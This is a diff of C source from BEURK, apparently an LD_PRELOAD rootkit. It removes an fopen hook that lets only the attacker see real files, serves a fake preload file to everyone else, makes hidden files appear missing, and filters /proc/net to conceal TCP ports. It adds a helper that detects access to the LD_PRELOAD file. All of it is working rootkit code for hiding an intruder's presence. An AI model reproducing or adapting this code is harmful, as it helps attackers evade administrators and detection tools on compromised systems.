@@ -18,30 +18,25 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <errno.h> /* errno, ENOENT */
-#include <string.h> /* strstr() */
-#include "beurk.h" /* is_attacker(), is_hidden_file(), is_procnet() */
-#include "config.h" /* REAL_FOPEN() */
+#include <limits.h> /* PATH_MAX */
+#include <stdlib.h> /* realpath(), free()*/
+#include <string.h> /* strcmp() */
+#include "beurk.h" /* prototype */
+#include "config.h" /* FILE, MAX_LEN, MAGIC_STRING, LIBRARY_NAME, ... */
 #include "debug.h" /* DEBUG() */
-#include "hooks.h" /* prototype, FILE */
 
-FILE *fopen(const char *__restrict path, const char *mode) {
+
+int         is_ld_preload_file(const char *file) {
     init();
-    DEBUG(D_INFO, "called fopen(3) hook");
+    DEBUG(D_INFO, "called is_ld_preload_file()");
 
-    if (is_attacker())
-        return (REAL_FOPEN(path, mode));
+    char    *path;
+    int     ret;
 
-    if (is_ld_preload_file(path))
-        return REAL_FOPEN(FAKE_LD_PRELOAD, mode);
-
-    if (is_hidden_file(path)) {
-        errno = ENOENT;
-        return (NULL);
-    }
-
-    if (is_procnet(path))
-        return (hide_tcp_ports(path));
-
-    return (REAL_FOPEN(path, mode));
+    path = realpath(file, NULL);
+    if (path == NULL)
+        return 0;
+    ret = !strcmp(path, LD_PRELOAD);
+    free(path);
+    return ret;
 }
